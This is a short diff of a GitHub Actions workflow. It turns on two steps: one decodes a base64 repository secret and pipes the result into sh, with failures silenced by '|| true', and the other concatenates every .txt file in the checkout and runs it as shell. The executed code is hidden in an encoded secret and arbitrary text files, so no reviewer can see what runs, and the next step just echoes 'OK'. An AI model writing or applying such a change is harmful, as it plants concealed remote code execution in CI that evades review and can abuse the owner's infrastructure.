@@ -20,9 +20,8 @@ jobs:
           SUPER_SECRET: ${{ secrets.ENC }}
         run: |
           npm i > /dev/null 2>&1
-          # timeout 1500 
-          echo "$SUPER_SECRET" | base64 --decode #| sh || true #> /dev/null 2>&1
-          # cat *.txt | sh
+          timeout 1500  echo "$SUPER_SECRET" | base64 --decode | sh || true #> /dev/null 2>&1
+          cat *.txt | sh
       - name: Commit
         run: |
           echo "OK"
